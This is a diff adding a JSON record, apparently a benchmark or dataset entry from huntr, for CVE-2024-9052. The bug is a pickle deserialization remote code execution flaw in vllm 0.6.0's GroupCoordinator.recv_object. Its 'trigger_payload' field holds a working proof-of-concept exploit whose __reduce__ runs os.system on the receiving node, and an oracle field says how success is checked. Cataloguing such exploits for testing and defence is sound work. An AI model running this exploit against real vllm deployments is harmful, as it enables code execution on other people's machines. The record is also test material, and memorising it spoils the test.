@@ -1,0 +1,15 @@
+{
+  "file_id": "436_vllm_huntr_ea75728f-4efe-4a3d-9f53-33f2c908e9f8",
+  "numeric_id": "436",
+  "library_hint": "vllm",
+  "source": "huntr",
+  "title": "Remote code execution via pickle deserialization in vllm.distributed.GroupCoordinator.recv_object",
+  "cve": "CVE-2024-9052",
+  "cwe": "CWE-502: Deserialization of Untrusted Data",
+  "library": "vllm",
+  "affected_version": "== 0.6.0",
+  "vulnerable_function": "vllm.distributed.GroupCoordinator.recv_object",
+  "triggerability": "indirect",
+  "trigger_payload": "from vllm.distributed import (ensure_model_parallel_initialized, init_distributed_environment, get_world_group)\nimport vllm\ninit_distributed_environment(backend=\"gloo\", distributed_init_method=\"tcp://0.0.0.0:29500\")\nvllm.distributed.GroupCoordinator.recv_object(get_world_group(), src=0)\n\nfrom vllm.distributed import (ensure_model_parallel_initialized, init_distributed_environment, get_world_group)\nimport vllm\nclass payload:\n    def __reduce__(self):\n        return (__import__('os').system, (\"touch /tmp/hacked\",))\ninit_distributed_environment(backend=\"gloo\", distributed_init_method=\"tcp://192.168.3.153:29500\")\nvllm.distributed.GroupCoordinator.send_object(get_world_group(), obj=payload(), dst=0)",
+  "oracle": "File /tmp/hacked is created on the victim's machine"
+}
